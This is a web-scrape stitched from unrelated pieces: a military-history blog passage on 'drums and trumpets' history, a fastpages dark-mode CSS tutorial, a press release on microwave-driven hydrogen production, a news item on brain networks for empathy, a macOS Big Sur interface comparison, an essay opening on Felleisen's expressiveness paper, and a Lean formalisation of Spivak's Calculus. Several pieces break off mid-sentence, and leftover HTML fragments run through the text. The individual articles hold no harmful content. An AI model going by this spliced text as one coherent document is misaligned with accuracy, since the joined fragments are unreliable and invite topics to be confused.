<p>The term for works of history in this narrow mold – all battles, campaigns and generals – is <strong>“drums and trumpets” history, a term generally used derisively</strong>.  The study of battles and campaigns emerged initially as a form of training for literate aristocrats preparing to be officers and generals; it is little surprise that they focused on aristocratic leadership as the primary cause for success or failure.  Consequently, the old ‘drums and trumpets’ histories also had a tendency to<a href="https://acoup.blog/2020/04/16/collections-a-trip-through-bertran-de-born-martial-values-in-the-12th-century-occitan-nobility/"> glory in war </a>and to glorify commanders for their ‘genius’ although this was by no means universal and works of history on conflict as far back as Thucydides and Herodotus (which is to say, as far back as there have been any) have reflected on the destructiveness and tragedy of war.  But military history, like any field, matured over time; I should note that it is <a href="https://acoup.blog/2020/02/07/collections-the-fremen-mirage-part-iiia-by-the-princess-irulan/">hardly the only field of history to have less respectable roots</a> in <a href="https://acoup.blog/2020/02/14/collections-the-fremen-mirage-part-iiib-myths-of-the-atreides/">its quite recent past</a>.  Nevertheless, as the field matured and moved beyond military aristocrats working to emulate older, more successful military aristocrats into a field of scholarly inquiry (still often motivated by the very real concern that officers and political leaders be prepared to lead in the event of conflict) the field has become far more sophisticated and its gaze has broadened to include not merely non-aristocratic soldiers, but non-soldiers more generally.</p>



<p>Instead of the ‘great generals’ orientation of ‘drums and trumpets,’ the field has moved in the direction of three major analytical lenses, laid out quite ably by Jeremy Black in “Military Organisations and Military Charge in Historical Perspective” (<em>JMH</em>, 1998). <strong> He sets out the three basic lenses as technological, social and organizational, which speak to both the questions being asked of the historical evidence but also the answers that are likely to be provided</strong>.  I should note that these lenses are mostly (though not entirely) about <em>academic</em> military history; much of the amateur work that is done is still very much ‘drums and trumpets’ (as is the occasional <em>deeply frustrating</em> books from some older historians we need not discuss here), although that is of course not to say that there isn’t good military history being written by amateurs or that all good military history narrowly follows these schools.  <strong>This is a classification system, not a straight-jacket and I am giving it here because it is a useful way to present the complexity and sophistication of the field as it is, rather than how it is imagined by those who do not engage with it.</strong></p>



<p>(I should note that <em>campaign studies</em> have not been entirely abandoned either.  What distinguishes the modern campaign or battle study from the old ‘drums and trumpets’ style is a broader use of historical causality that reaches beyond just upper-level command decisions. <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/"> Our recent recommendation, <em>Shattered Sword</em></a> is a good example of how what might have been a ‘drums and trumpets’ narrative of admirals and captains can instead be developed, using more sophisticated historical methods, into a much more complete and compelling historical argument about organizations, doctrines, technologies and so on.  And of course campaign histories will never go out of style – they are the essential foundation on which all other kinds of analysis must be laid)</p>



<p><strong>The technological approach is perhaps the least in fashion these days</strong>, but Geoffery Parker’s <em>The Military Revolution</em> (2nd ed. 1996) provides an almost pure example of the lens.  This approach tends to see changing technology – not merely military technologies, but often also civilian technologies – as the main motivator of military change (and also success or failure for states caught in conflict against a technological gradient).  <strong>Consequently, historians with this focus are often asking questions about how technologies developed, why the developed in certain places, and what their impacts were</strong>.  Another good example of the field, for instance, is the debate about the impact of <a href="https://www.amazon.com/gp/product/0700623833/ref=ppx_yo_dt_b_search_asin_title?ie=UTF8&amp;psc=1">rifled muskets</a> in the <a href="https://www.amazon.com/gp/product/171985727X/ref=ppx_yo_dt_b_asin_title_o07_s00?ie=UTF8&amp;psc=1">American Civil War</a>.  While there has been a real drift away from seeing technologies themselves as decisive on their own (and thus a drift away from mostly ‘pure’ technological military history) in recent decades, this sort of history is very often paired with the others, looking at the ways that social structures, organizational structures and technologies interact.</p>



<p><strong>Perhaps the <em>most</em> popular lens for military historians these days is the social one</strong>, which used to go by the “new military history” (<em>decades </em>ago – it was the standard form even back in the 1990s) but <strong>by this point comprises probably the bulk of academic work on military history</strong>.  In its narrow sense, the social perspective of military history seeks to understand the army (or navy or other service branch) as an extension of the society that created it.  We have, you may note,<a href="https://acoup.blog/2020/05/22/collections-the-battle-of-helms-deep-part-iv-men-of-rohan/"> done a bit of that here</a>.  Rather than understanding the army as a pure instrument of a general’s ‘genius’ it imagines it as a <em><strong>socially embedded</strong></em> institution – which is …</p></div></div>

  <div itemprop="articleBody">
    <p>I have come to talk with you again, this time for my <code>fastpages</code> blog.</p>

<p><code>fastpages</code> gets a lot of things right for someone who uses <code>Jupyter</code> notebooks and wants to get into blogging. Prashanth Rao’s <a href="https://prrao87.github.io/blog/blogging-for-data-scientists/">article</a> does a great job of making the case for that.</p>



<p>However, being a long time user of the <a href="https://darkreader.org/">Dark Reader</a> browser extension, it was unusual to not have widespread dark mode support on many Jekyll themes, one of which <code>fastpages</code> is built on. Therefore, I decided to bring back the dark mode experience in this post.</p>

<p><img src="https://prudhvirampey.com/blog/images/dark-side.gif" alt=""></p>

<p>I personally prefer dark mode to light as it causes lesser strain on the eyes. It also helps illuminate content while the background fades away. For someone who spends a good part of the day stuck behind a screen, I’ve made it a point to keep the bright light intake for outdoors.</p>

<p>Since I have not dabbled in designing dark mode experiences before, I plan to keep this process simple and understandable. We shall be using a bunch of simple css rules while following Material Design dark theme <a href="https://material.io/design/color/dark-theme.html">guidelines</a> (mostly).</p>

<p>Here’s the sample fastpages sample blog <a href="https://fastpages.fast.ai/jupyter/2020/02/20/test.html">post</a> without Dark mode:</p>

<p><img src="https://prudhvirampey.com/blog/images/light-mode.png" alt="" title="Curb your light mode"></p>

<p>And here’s the <a href="https://prudhvirampey.com/blog/jupyter/2020/02/20/test.html">same one</a> with dark mode enabled!</p>

<p><img src="https://prudhvirampey.com/blog/images/dark-mode.png" alt=""></p>

<p>Pretty cool, yeah? Let’s check out the code now.</p>

<p>If you’re in a hurry to join the dark side, feel free to scroll to the end of this post and download the dark mode stylesheet.</p>

<p>If your curious about the design choices I’ve made and would like to customize for yourself, stick with me here.</p>



<p>Let’s start with defining our palette.</p>

<div><div><pre><code><span>$high-emph</span><span>:</span> <span>rgba</span><span>(</span><span>white</span><span>,</span> <span>0</span><span>.87</span><span>);</span> <span>// Colour 1 -&gt; White</span>
<span>$med-emph</span><span>:</span> <span>rgba</span><span>(</span><span>white</span><span>,</span> <span>0</span><span>.69</span><span>);</span> <span>//Noice</span>
<span>$low-emph</span><span>:</span> <span>rgba</span><span>(</span><span>white</span><span>,</span> <span>0</span><span>.38</span><span>);</span>
<span>$dark-grey</span> <span>:</span> <span>#121212</span><span>;</span> <span>// Colour 2</span>
<span>$overlay</span><span>:</span> <span>mix</span><span>(</span><span>$dark-grey</span><span>,</span> <span>white</span><span>,</span> <span>95%</span><span>);</span>
<span>$overlay-light</span><span>:</span> <span>mix</span><span>(</span><span>$dark-grey</span><span>,</span> <span>white</span><span>,</span> <span>86%</span><span>);</span>
</code></pre></div></div>

<p>That’s it. Two colours and their shades.</p>

<p><img src="https://prudhvirampey.com/blog/images/palette.svg" alt="" title="From left, dark grey and its shades and then the whites"></p>

<ul>
  <li>Baseline <code>dark-grey</code> theme colour which is recommended by Material design and <em>lighter</em> variants of it for components such as code blocks and tables.</li>
  <li>Shades of <code>white</code> for different levels of emphasis of text. <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></li>
</ul>

<p>This also gives us the flexibility to choose <em>our own</em> primary dark color. For eg, if we change the value of <code>dark-grey</code> to that of something like <code>deep-purple</code> (<code>#1F1B24</code>). Voilà, we get the following palette:</p>

<p><img src="https://prudhvirampey.com/blog/images/palette-2.svg" alt=""></p>

<p>and theme:</p>

<p><img src="https://prudhvirampey.com/blog/images/purple-mode.png" alt=""></p>

<p>The palette can be easily customized to support your own favorite dark colour!</p>



<p>The rest of the stylesheet is more or less straightforward. Here are some additional quirks that I thought were cool:</p>

<ul>
  <li>Don’t forget to turn over your faithful scrollbar to the dark side</li>
</ul>

<div><div><pre><code><span>*</span> <span>{</span>
    <span>scrollbar-color</span><span>:</span> <span>$dark-grey</span> <span>$overlay-light</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p><img src="https://prudhvirampey.com/blog/images/scrollbars.png" alt=""></p>

<ul>
  <li>You can invert the colour of your charts and plots to keep that dark consistency going.</li>
</ul>

<div><div><pre><code><span>canvas</span> <span>{</span>
    <span>filter</span><span>:</span> <span>invert</span><span>(</span><span>100%</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p><img src="https://prudhvirampey.com/blog/images/light-dark-viz.png" alt="" title="I like my graphs like I like my chocolate, dark"></p>

<blockquote>
  <p>Psst, Check out the dark graphs in action <a href="http://prudhvirampey.com/new_blog/jupyter/2020/02/20/test.html#Example-1:-DropDown">here</a>.</p>
</blockquote>

<ul>
  <li>We also got some dark tables in the house babyy 👾</li>
</ul>

<p><img src="https://prudhvirampey.com/blog/images/light-dark-tables.png" alt="" title="Let there be shiny data"></p>



<p>You can get the stylesheet from this Github gist <a href="https://gist.github.com/prampey/aac8f8436827ea09f53a67873142706c">here</a>. Save it to <code>_sass/minima</code> and add this import line in <code>custom-styles.scss</code>.</p>

<div><div><pre><code><span>/*-----------------------------------*/</span>
<span>/*----- ADD YOUR STYLES BELOW -------*/</span>

<span>@import</span> <span>"minima/dark-mode"</span><span>;</span>

<p>That’s it! <code>fastpages</code> finally has the power of the dark side.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p><img src="http://www.upv.es/noticias-upv/imagenes/int_itq.jpg" alt="" title=""></p><p>A team of researchers from the Universitat Politècnica de València  (UPV) and the Spanish National Research Council (CSIC) has discovered a new method that makes it possible to transform electricity into hydrogen or chemical products by solely using microwaves – without cables and without any type of contact with electrodes. This can represent a disruption in the field of energy research and a key development for the decarbonisation of process industry, as well as for the future of the automotive sector and the chemical industry, among many others. The study has been published in the latest edition of Nature Energy.</p> 
<p>The technology developed and patented by the UPV and CSIC is based on the phenomenon of the microwave reduction of solid materials, in this study exemplified by the reduction of Cerium oxide. This method enables to carry out electrochemical processes directly without requiring electrodes, which simplifies and significantly reduce capital costs, as it provides more freedom in the design of the structure of the device and choosing the operation conditions, mainly the electrolysis temperature.</p> 
<p>“It is a technology with great practical potential, especially for its use in energy storage and production of synthetic fuels and green chemicals. This aspect has significant importance nowadays, as both transportation and industry are immersed in a transition towards decarbonisation and electrification, meaning they have to meet very challenging targets in 2030 and 2040 in order to decrease the consumption of energy and substances from fossil sources, mainly natural gas and oil,” highlights Prof. José Manuel Serra, researcher from the Chemical Technology Institute (ITQ).</p> 
<h3>Green hydrogen for industrial and transportation uses</h3> 
<p>The main use of this “disruptive” technology reported by researchers from the Information Technologies and Communications Institute (ITACA) of the UPV and ITQ, joint centre of the UPV and CSIC, is the production of green hydrogen (produced without emitting greenhouse gases) from water, for industrial and transportation uses.</p> 
<p>As noted by the ITQ and ITACA team, it is a technology with great potential for the automotive sector, specifically for cars fuelled by fuel cells and hybrids or large vehicles such as trains or ships. But also for the chemical industry, metallurgy, the ceramic sector or the production of fertilisers, among many other sectors. “This method will make it possible to transform renewable electricity, typically of solar or wind origin, into added value products and green fuels. It has countless uses and we hope that new uses will emerge for energy storage and process industry, by tuning materials composition and operation conditions”, highlights Prof. José Manuel Catalá, researcher at the ITACA institute of the UPV.</p> 
<p>In the article published in Nature Energy, the researchers also provide a techno-economic study that reveals that this technology would enable to obtain high energetic efficiency, and that the cost of the facilities (CAPEX) to carry out the hydrogen production process are very competitive compared to conventional technologies for hydrogen production.</p> 
<h3>Ultra-fast charging of batteries… and space exploration</h3> 
<p>The UPV and CSIC team is studying other future uses for this technology, and is currently focusing its efforts on the use for the ultra-fast charging of batteries “Our technology could enable a practically instantaneous reduction (electron injection) of the electrode (metallic anode) that stores energy. In other words, we would go from a (2D) layer-based progressive charging process, which can take hours, to a simultaneous recharging process in the entire (3D) volume of the material storing the energy, which would make it possible to charge a battery in a few seconds,” says Prof. Catalá.</p> 
<p>Another use would be the direct generation of oxygen with microwaves, which opens a broad spectrum of new uses. “One specific use would be the direct production of oxygen with extra-terrestrial rocks (regoliths), which could have a key role in the future exploration and colonisation of the Moon, Mars or other moons in the solar system,” concludes Prof. Serra.</p> 
<h3>A short history of the discovery</h3> 
<p>The team of researchers observed that when ionic materials were treated with microwaves, the materials displayed unusual changes in their properties, especially in their electronic conductivity, changes that did not happen upon conventional heating. “We were very intrigued about these sudden changes in their electrical properties and wanted to understand what process was going on. For this reason, we keep on designing new experiments, new microwave reactors and utilizing other analytical techniques,” explains Prof. Catalá.</p> 
<p>The team from the ITACA and ITQ institutes verified that microwaves interact with these materials by ‘accelerating’ the electrons and triggering the release of molecules of oxygen from their structure (which is also called reduction). This change became visible to us by sudden alterations to the conductivity at relatively low temperatures (approximately 300ºC). “This non-equilibrium state is maintained while microwaves are applied, but tends to revert back via reoxygenation (reoxidation) when microwaves are switched off. At first sight, we realised the great practical potential of this discovery, especially now that very ambitious goals should be meet in the next two decades to reach an economy with zero net greenhouse gas emissions,” concludes Prof. Serra.</p>

  <p>Being able to feel empathy and to take in the other person's perspective – these are two abilities through which we understand what is going on in the other person's mind. Although both terms are in constant circulation, it is still unclear what exactly they describe and constitute. Scientists at the Max Planck Institute for Human Cognitive and Brain Sciences (MPI CBS) in Leipzig, together with colleagues from Oxford University and other institutions, have now developed a model which explains what empathy and perspective taking are made of. They show that it is not one specific skill that enables us to put ourselves in another person's shoes. These skills are made up of many individual factors that vary according to the situation.</p>

<p>Understanding what other people want, how they feel, and how they see the world is becoming increasingly important in our complex, globalised society. Social skills enable us to make friends and create a network of people who support us. But not everyone finds it easy to interact with other people. One of the main reasons is that two of the most important social skills - empathy, i.e. being able to empathise with the other person's emotions, and the ability to take a perspective, i.e. being able to gain an information by adopting another person’s point of view - are developed to different degrees.</p>
<p>Researchers have long been trying to find out what helps one to understand others. The more you know about these two social skills, the better you can help people to form social relationships. However, it still not exactly clear what empathy and perspective taking are (the latter is also known as “theory of mind“). Being able to read a person's emotions through their eyes, understand a funny story, or interpret the action of another person—in everyday life there are always social situations that require these two important abilities. However, they each require a combination of different individual subordinate skills. If it is necessary to interpret looks and facial expressions in one situation, in another it may be necessary to think along with the cultural background of the narrator or to know his or her current needs.</p>

          Both capabilities, empathy and theory of mind, are processed in the brain by a 'main network' specialised in empathy (red brain areas) or changing perspective (blue brain areas), which is activated in every social situation. But, depending on the situation, it also involves additional networks.

<p>To date, countless studies have been conducted that examine empathy and perspective taking as a whole. However, it has not yet been clarified what constitutes the core of both competencies and where in the brain their bases lie. Philipp Kanske, former MPI CBS research group leader and currently professor at the TU Dresden, together with Matthias Schurz from the Donders Institute in Nijmegen, Netherlands, and an international team of researchers, have now developed a comprehensive explanatory model.</p>
<p>"Both of these abilities are processed in the brain by a 'main network' specialised in empathy or changing perspective, which is activated in every social situation. But, depending on the situation, it also involves additional networks," Kanske explains, referring to the results of the study, which has just been published in the journal&nbsp;<i>Psychological Bulletin</i>. If we read the thoughts and feelings of others, for example, from their eyes, other additional regions are involved than if we deduce them from their actions or from a narrative. "The brain is thus able to react very flexibly to individual requirements."</p>
<p>For empathy, a main network that can recognise acutely significant situations, for example, by processing fear, works together with additional specialised regions, for example, for face or speech recognition. When changing perspective, in turn, the regions that are also used for remembering the past or fantasising about the future, i.e., for thoughts that deal with things that cannot be observed at the moment, are active as the core network. Here too, additional brain regions are switched on in each concrete situation.</p>
<p><strong>Complex social problems require a combination of empathy and perspective taking</strong></p>
<p>Through their analyses, the researchers have also found out that particularly complex social problems require a combination of empathy and a change of perspective. People who are particularly competent socially seem to view the other person in both ways­—­on the basis of feelings and on the basis of thoughts. In their judgement, they then find the right balance between the two.</p>
<p>"Our analysis also shows, however, that a lack of one of the two social skills can also mean that not this skill as a whole is limited. It may be that only a certain factor is affected, such as understanding facial expressions or speech melody," adds Kanske. A single test is therefore not sufficient to certify a person's lack of social skills. Rather, there must be a series of tests to actually assess them as having little empathy, or as being unable to take the other person's point of view.&nbsp;</p>
<p>The scientists have investigated these relationships by means of a large-scale meta-analysis. They identified, on the one hand, commonalities in the MRI pattern of the 188 individual studies examined when the participants used empathy or perspective taking. This allowed the localisation of the core regions in the brain for each of the two social skills. However, results also indicated how the MRI patterns differed depending on the specific task and, therefore, which additional brain regions were used.&nbsp;</p>

<div itemprop="articleBody">
<p><img src="https://www.andrewdenty.com/blog/assets/img/catalina-vs-big-sur.jpg" alt="Catalina vs Big Sur">
This post is an attempt to provide a visual comparison of pretty dramatic UI changes between macOS Catalina and Big Sur.</p>
<p>Why did I end up doing this? Well, this week I installed the developer beta of macOS Big Sur as I was curious what impact the new UI would have on the <a href="https://www.andrewdenty.com/airtame-desktop-app.html">app I currently design</a>. I wanted to make sure my team was ahead of any coming changes as we were burned by changes in last year’s release of Catalina.</p>
<p>I found myself taking lots of screenshots to try and track the changes and thought this might be worth sharing. I decided to carry out a quick catalogue of the UI changes as this may be helpful to other people getting ready for macOS Big Sur.</p>
<p>All of the screenshots below are taken on a default install of macOS and the Catalina version is always on the left. I made a conscious effort not to resize any windows or change any default settings. I haven’t captured everything, but it is a good taste of the changes so far.</p>
<h2 id="first-impressions">First impressions</h2>


<p>At first glance macOS is a lot more colourful with, and the biggest obvious change is the bright, slightly more cartoonish iOS shaped icons. Everything is more rounded and it feels like everything has gotten a little bigger. Could this be the first hint that macOS is preparing for touch support in the future? One interesting tidbit, is that even though the icons are based around the capsule shape, many of them (like Contacts, or Preview) have elements which protrude from them giving an extra feeling of depth.</p>
<h2 id="finder-and-preview">Finder and Preview</h2>
<p>Finder sees some significant changes. Of all the places I think Apple needs to get the new UI spot on, is Finder. Overall the default size of Finder seems to be bigger in macOS Big Sur.</p>


<p>One thing that struck me at this point is that Finder looks a mess with many of the more advanced features enabled. The bottom screenshot shows Finder with a Path Bar, Status Bar and multiple tabs. To me, it seems like the design team have not yet been able to find a way to elegantly integrate these elements into the iOS inspired UI.</p>
<p>One final thing to note is that in Finder the search bar at the top right has been replaced with a search icon that expands when clicked. This change seems a little inconsistent as it’s not made it to Preview. I can guarantee this will result in fewer people discovering Finder’s Spotlight search goodness.</p>
<h2 id="preferences">Preferences</h2>
<p>Preferences sees quite a lot of change in some areas.
The Dock preferences pane has become “Dock and Menu Bar” and now integrates controls for the new macOS control center. It uses a nicely integrated sidebar to manage different categories.</p>
<p>It’s a shame that this sidebar hasn’t yet made it to other parts of the preferences UI with Network and Notifications still using a very old looking sidebar.</p>
<p>One aspect of preferences that has been quite controversial (on Twitter at least) is the new icons. I’m going to hold off judgement for now as they don’t yet look finished. For example, the Notifications icon does not even support retina displays.</p>


<p>You’ll notice that the Startup Disk pane uses apples new dialog (or sheet) UI. This is quite a departure from the existing sheet drop-down - it feels much more iOS-like.</p>
<h2 id="menu-bar-and-notification-center">Menu Bar and Notification Center</h2>
<p>This is one of the areas where macOS has changed the most. It’s also difficult to take decent screenshots of both of these. Control Center looks like it’s been badly photocopied and the Notification Center in Catalina has a bug whereby it renders at double it’s normal width.</p>
<p>What was obvious within a few minutes of use was that the Control Center is a massive improvement on Catalina’s row of scattered Menu bar icons. The updated WiFi menu is also a massive improvement, as the old list could easily be overwhelming with the number of WiFi networks displayed.</p>
<p>I’m less convinced that the Notification Center is easier to use though. Now it has no background, there is less to separate a list of notifications from my messy desktop!</p>
<p>I will try and get better screenshots for this section and update it in the near future.</p>


<h2 id="safari">Safari</h2>





<h2 id="reminders">Reminders</h2>


<h2 id="notes">Notes</h2>
<p>The biggest news in Notes is that after years, the Skeuomorphic paper texture has finally been retired!</p>


<h2 id="photos">Photos</h2>


<h2 id="apple-music-and-podcasts">Apple Music and Podcasts</h2>
<p>Music and Podcasts were brand new last year with the release of Catalina. It’s obvious that the new UI has been planned for a while as Apple Music and Podcasts are mostly indistinguishable from their initial Catalina release. For example both apps already include the new full height sidebar.</p>
<p>For me this illustrates a bigger point that <a href="https://twitter.com/stevesi/status/1275311056672325633" target="_blank">Steven Sinofsky recently made on Twitter</a> - that Apple is executing a meticulous multi-year strategy.</p>


<p>One area where changes are evident are is in preferences windows. Both apps make use of Apple’s new accent colour and new glyph icon library.</p>
<h2 id="other-bundled-apps">Other bundled apps</h2>
<p>It was impossible to go into depth with every single bundled app. On the whole, the updates to Maps, Books and Mail all look solid with extensive use of the new sidebar.</p>


<h2 id="utilities">Utilities</h2>
<p>Both Activity Monitor and Disk Utility have received a new style toolbar. As with Finder, there are no longer any rows meaning all elements are at the same level. On first impressions, I feel this is a little visually confusing and makes it harder to scan. The search field also loses a lot of its contrast.</p>
<p>Unsurprisingly Terminal is almost unchanged.</p>


<h2 id="almost-unchanged">Almost unchanged</h2>
<p>On the subject of unchanged apps, there were a number of other apps that are so far relatively unchanged.</p>
<p>Siri in macOS Big Sur shows no apparent changes. I think this is a little strange considering the overhaul Siri is receiving in iOS 14. There don’t even seem to be any radius changes to the borders.</p>
<p>The most extreme case of no change is Stickies. It’s completely identical between both releases. What’s more, I don’t think it’s changed much since MacOS 9 judging from its weird, retro controls.</p>


<p>Boot Camp is also practically unchanged, although this is perhaps unsurprising given Apple’s move to Apple Silicon, so presumably Boot Camp’s days are numbered. It did receive a new icon though.</p>
<h2 id="takeaways">Takeaways</h2>
<p>Overall, the UI changes in macOS aren’t as dramatic as I was expecting. Big Sur’s new UI feels like a largely incremental set of changes to make macOS feel more coherent with iOS and iPad OS. Even if there are a few teething issues and the look is a little jarring at first, this has to be a good thing in the long-term.</p>
<p>Having said that, Apple still has a vast amount of work to do to perfect the new macOS UI. It unsurprising as this is the first developer beta, but there are still many rough edges.</p>
<p>I hope in the long term they focus on creating consistent patterns: for example for the first launch experience of apps. Right now there are several different layouts and approaches to this UI. I also hope Apple don’t leave pro users behind. Right now some of the less frequently used UI elements such as status bars and path bars look a little unloved. They don’t feel well integrated into the UI and in some cases lack visual separation.</p>

      Papers are like poems. Some are dazzling, some are pedestrian, some are insightful, and some reward long periods of quiet contemplation. They stir up an emotional reaction that goes beyond the strictly rational, and can often be deeply personal.</p>

    <p>
      In graduate school, during a period of identity crisis, I came across <a href="https://felleisen.org/matthias/">Matthias Felleisen's</a> “<a href="https://www.sciencedirect.com/science/article/pii/016764239190036W">On the Expressive Power of Programming Languages</a>”. At a time when the world was ruled by C++, I had immersed myself in Scheme, so I always looked skeptically at mainstream linguistic claims. However, the language wars seemed beyond rational discourse. So the idea that someone could take a concept as nebulous as “expressiveness&amp;rdquo and formalize it was already a revelation. But the beauty of this paper goes well beyond that: it also lies in the cleanliness of the approach, the correspondence of the formalism to intuition, and the tautness of its execution.</p>

    <p>
      It was the most stunning paper I had ever read, and remains so. It's like the poem that never leaves your soul.</p>

    <p>
      Unfortunately, this paper may not be easy to read for the uninitiated: it depends on a certain amount of “cultural knowledge” of programming language theory. I hope to peel off some of those layers and help you, too, understand the paper — hopefully while preserving the joy and beauty I experienced.</p>

    <p>This post contains three updates at different points in time on formalizing
chapter 1 of Michael Spivak’s <em>Calculus</em> book and its problems in <a href="https://leanprover-community.github.io/">Lean</a>.</p>
<p>You can find the proofs <a href="https://github.com/tomhoule/spivak-calculus/">on GitHub</a>.</p>

<p>On n’écrit qu’à la pointe de son savoir, à cette pointe extrême qui sépare
notre savoir et notre ignorance, et qui fait passer l’un dans l’autre. C’est
seulement de cette façon qu’on est déterminé à écrire.</p>
<p>(<a href="https://en.wikipedia.org/wiki/Difference_and_Repetition"><em>Différence et
répétition</em></a>, towards
the beginning)</p>
</blockquote>
<p>They say the right time to write about something is while learning. I just got
through <a href="https://leanprover.github.io/theorem_proving_in_lean/"><em>Theorem proving in
Lean</em></a> — tons of fun,
warmly recommended — and now feels like the time to see what I can do with it.</p>
<p>I have Michael Spivak’s
<a href="https://www.goodreads.com/book/show/328645.Calculus"><em>Calculus</em></a>, third
edition, lying around at home. It should be accessible with a bit of help from
the internet, so this is what I will attempt to go through. I expect nearly all
of the book’s content to be new to me.</p>
<p>What I want to validate is that for someone reasonably familiar with programming
who wants to learn more mathematics, it is possible to learn by writing proofs
and solving problems from regular maths textbooks with existing tools, and in
particular the Lean theorem prover. <strong>The hard part should be the mathematics,
not handling the theorem prover</strong>.</p>
<p>I have the feeling this would be the best way for me to learn, since I lack the
confidence in my hand-written proofs, and I know by experience that I make a lot
of mistakes. On paper, these mistakes end up derailing the proof, but they
wouldn’t have serious consequences if every step was checked by a computer: I
can just correct them.</p>
<p>I will frequently refer to
<a href="https://github.com/leanprover-community/mathlib">mathlib</a>, the Lean community’s
library of formalized theorems. It contains basic facts and structures you do
not want to build again when writing your own proofs, as well as extremely
useful tactics like <a href="https://leanprover-community.github.io/mathlib_docs/tactics.html#linarith"><code>linarith</code></a>.</p>
<h3 id="first-chapter">First chapter</h3>
<p>The first chapter is titled <em>Basic properties of numbers</em>. Its purpose is to
reformulate and condense facts that the reader supposedly already knows.</p>
<p>Twelve properties are treated. Four properties of addition:</p>
<ol>
<li>Associativity: $$ a + (b + c) = (a + b) + c $$</li>
<li>Zero as the identity element: $$ a + 0 = 0 + a = a $$</li>
<li>Addition of opposites: $$ a + (-a) = (-a) + a = 0 $$</li>
<li>Commutativity: $$ a + b = b + a $$</li>
</ol>
<p>By now, subtraction is already defined, and two small proofs already carried
out. I used the standard library’s <code>int</code> module for the time being, but
I suspect we’ll have to switch to mathlib’s real number module or something
else, after I read a bit more about it.</p>
<p>The next properties are about multiplication:</p>
<ol start="5">
<li>Associativity: $$ a \cdot (b \cdot c) = (a \cdot b) \cdot c $$</li>
<li>One as the identity element: $$ a \cdot 1 = 1 \cdot a = a $$</li>
<li>Multiplication of inverses:
$$ \forall a, a ≠ 0 \to \exists a^{-1}, a \cdot a^{-1} = a^{-1} \cdot a = 1 $$</li>
<li>Commutativity: $$ a \cdot b = b \cdot a $$</li>
</ol>
<p>Division is then defined in terms of multiplication. The part of property 7
about <em>a</em>&nbsp;≠&nbsp;0 explains why division by zero doesn’t work (it has no meaningful
inverse).</p>
<p>At this point, I feel an itch to generalize this beyond integers. We’re going to
need at least real numbers, I figure. I start browsing Wikipedia:
<a href="https://en.wikipedia.org/wiki/Group_(mathematics)">groups</a> aren’t what we want
(numbers under addition are a group, but not multiplication because it lacks
invertibility). Next stop is
<a href="https://en.wikipedia.org/wiki/Multiplication#Multiplication_of_different_kinds_of_numbers">multiplication</a>,
which points me to the page on the <a href="https://en.wikipedia.org/wiki/Construction_of_the_real_numbers#Construction_from_Cauchy_sequences">construction of real
numbers</a>,
where I&nbsp;learn about <a href="https://en.wikipedia.org/wiki/Field_(mathematics)">ordered
fields</a>. This is apparently
what we&nbsp;want, and mathlib <a href="https://leanprover-community.github.io/mathlib-overview.html">apparently supports
them</a>.</p>
<p>I hope this attitude of digging just as deep as I need to in order to make
progress is going to work out.</p>
<p>After a little while digging into how to import mathlib (combination of using
the right lean version in <code>leanpkg.toml</code>, learning the existence of <code>import</code>
statements, and the right <code>leanpkg</code> invocations — <em>Note added later: use
<code>leanproject</code> instead if you want to avoid compiling mathlib, it is very
time-consuming</em>), I realize working with fields won’t let you use convenient
numeric notations. I try real numbers — appropriately located at
<code>data.real.basic</code> in mathlib — only to realize that reflexivity doesn’t work for
things as simple as <code>5 - 3 = 2</code>. Looking at the source for the <code>data.real.basic</code>
module, it seems like many definitions are non-computable. It makes sense,
because real numbers aren’t the floats we know and love, π isn’t some
approximation but really π, and we can’t compute that exactly. I don’t know whether Lean
can “specialize” computable instances automatically, and detect that even though
<code>5</code> and <code>3</code> are real numbers in this context, <code>5 - 3</code> is computable. I’d have to
know more about representations of reals to know if it’s a temporary limitation
in mathlib or something deeper. So I go with rational numbers for the examples
involving reflexivity. <code>α</code> is a field, rational numbers are a field, so it works
out nicely.</p>
<p>The consequences of the properties of multiplication give rise to two nice
examples we can prove in Lean:</p>
<pre><code>example : (a ≠ 0) → (a * b = a * c) → b = c :=
assume hnzero h,
    calc
        b   = 1 * b : by rw one_mul
        ... = (a⁻¹ * a) * b : by rw [inverse_mul α a hnzero]
        ... = a⁻¹ * (a * b) : by rw [mul_assoc']
        ... = a⁻¹ * (a * c) : by rw [h]
        ... = c : by rw [mul_assoc', inverse_mul α a hnzero, one_mul]

example : a ≠ 0 → (a * b = 0) → (a = 0 ∨ b = 0) :=
assume hnzero h,
or.inr $ calc
    b = 1 * b : by rw one_mul b
    ... = (a⁻¹ * a) * b : by rw [inverse_mul α a hnzero]
    ... = a⁻¹ * (a * b) : by rw [mul_assoc']
    ... = a⁻¹ * 0 : by rw h
    ... = 0 : by rw mul_zero
</code></pre>
<p>I started by adding <code>decidable α</code> instance on top of <code>field α</code> to get
<code>a&nbsp;=&nbsp;0&nbsp;∨&nbsp;¬(a&nbsp;=&nbsp;0)</code> for the second example. It felt like it should be possible to
prove it without, but it seemed like even mathlib uses <code>classical</code> (see
<code>mul_eq_zero'</code> in <code>group_with_zero.lean</code>, and <code>division_ring.to_domain</code> in
<code>field.lean</code>). Then I noticed the book relies on <code>a ≠ 0</code> and added the hypothesis.</p>
<ol start="9">
<li>Distributivity: $$ a \cdot (b + c) = (a \cdot b) + (a \cdot c) $$</li>
</ol>
<p>For the next proof, I needed a proof of <code>0&nbsp;≠&nbsp;2</code>, which I got to from <code>0&nbsp;&lt;&nbsp;2</code>,
which required changing the instance of <code>field&nbsp;α</code> to <code>linear_ordered_field&nbsp;α</code>.
That seems reasonable.</p>
<p>Writing down the proof also made it clearer that the part that needs
distributivity is <code>a&nbsp;+&nbsp;a&nbsp;= 2&nbsp;*&nbsp;a</code>:</p>
<pre><code>def add_self_eq_two_mul : a + a = 2 * a :=
calc
    a + a   = (a * 1) + a : by rw mul_one'
        ... = (a * 1) + (a * 1) : by rw mul_one'
        ... = a * (1 + 1) : by rw [←mul_distrib']
        ... = a * 2 : by refl
        ... = 2 * a : by rw mul_comm'
</code></pre>
<p><code>-a</code> can also be called an additive inverse. Interesting.</p>
<p>…<em>ellipsis</em>…</p>
<hr>
<h2 id="two-weeks-later">Two weeks later</h2>
<p>I continued going through the chapter step by step, and now getting started on
the problems.</p>
<ul>
<li>Some patterns like “divide both sides of the equation by the same amount” do
